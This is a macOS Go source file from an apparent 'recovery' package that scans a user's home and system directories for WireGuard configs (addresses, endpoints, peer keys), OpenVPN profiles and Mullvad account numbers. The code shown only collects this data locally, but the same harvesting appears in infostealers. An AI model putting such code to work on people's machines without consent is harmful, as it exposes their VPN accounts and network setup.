//go:build darwin

package recovery

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

func ScanVPNs() *types.VPNResult {
	result := &types.VPNResult{
		WireGuard: scanWireGuard(),
		OpenVPN:   scanOpenVPN(),
		Mullvad:   scanMullvad(),
	}
	if len(result.WireGuard) == 0 && len(result.OpenVPN) == 0 && len(result.Mullvad) == 0 {
		return nil
	}
	return result
}

func scanWireGuard() []types.WireGuardResult {
	var results []types.WireGuardResult

	configDirs := []string{
		"/usr/local/etc/wireguard",
		"/opt/homebrew/etc/wireguard",
	}
	home, _ := os.UserHomeDir()
	if home != "" {
		configDirs = append(configDirs, filepath.Join(home, ".config", "wireguard"))
	}

	for _, configDir := range configDirs {
		if !pathExists(configDir) {
			continue
		}
		entries, err := os.ReadDir(configDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".conf") {
				continue
			}
			confData, err := os.ReadFile(filepath.Join(configDir, e.Name()))
			if err != nil || len(confData) == 0 {
				continue
			}

			var iface, peer, endpoint string
			for _, line := range strings.Split(string(confData), "\n") {
				line = strings.TrimSpace(line)
				if key, val, ok := strings.Cut(line, "="); ok {
					key = strings.TrimSpace(key)
					val = strings.TrimSpace(val)
					switch key {
					case "Address":
						iface = val
					case "Endpoint":
						endpoint = val
					case "PublicKey":
						if peer == "" {
							peer = val
						}
					}
				}
			}

			results = append(results, types.WireGuardResult{
				Name:      e.Name(),
				Interface: iface,
				Peer:      peer,
				Endpoint:  endpoint,
			})
		}
	}

	return results
}

func scanOpenVPN() []types.OpenVPNResult {
	var results []types.OpenVPNResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	ovpnDirs := []string{
		filepath.Join(home, ".config", "openvpn"),
		filepath.Join(home, "OpenVPN", "config"),
		filepath.Join(home, "Library", "Application Support", "OpenVPN Connect", "profiles"),
	}

	for _, ovpnDir := range ovpnDirs {
		if !pathExists(ovpnDir) {
			continue
		}
		entries, err := os.ReadDir(ovpnDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".ovpn") {
				continue
			}
			results = append(results, types.OpenVPNResult{
				Name: e.Name(),
				Path: filepath.Join(ovpnDir, e.Name()),
			})
		}
	}

	return results
}

func scanMullvad() []types.MullvadResult {
	var results []types.MullvadResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	dir := filepath.Join(home, "Library", "Application Support", "Mullvad VPN")
	if !pathExists(dir) {
		return nil
	}

	for _, name := range []string{"settings.json", "account-history.json"} {
		path := filepath.Join(dir, name)
		data, err := os.ReadFile(path)
		if err != nil || len(data) == 0 {
			continue
		}
		var raw map[string]json.RawMessage
		if json.Unmarshal(data, &raw) != nil {
			var token string
			if json.Unmarshal(data, &token) == nil && token != "" && !mullvadAlreadyFound(results, token) {
				results = append(results, types.MullvadResult{AccountNumber: token, SettingsPath: path})
			}
			continue
		}
		for _, key := range []string{"account_token", "accountToken", "account_number", "account"} {
			v, ok := raw[key]
			if !ok {
				continue
			}
			var token string
			if json.Unmarshal(v, &token) == nil && token != "" && !mullvadAlreadyFound(results, token) {
				results = append(results, types.MullvadResult{AccountNumber: token, SettingsPath: path})
				break
			}
		}
	}

	return results
}

func mullvadAlreadyFound(results []types.MullvadResult, account string) bool {
	for _, r := range results {
		if r.AccountNumber == account {
			return true
		}
	}
	return false
}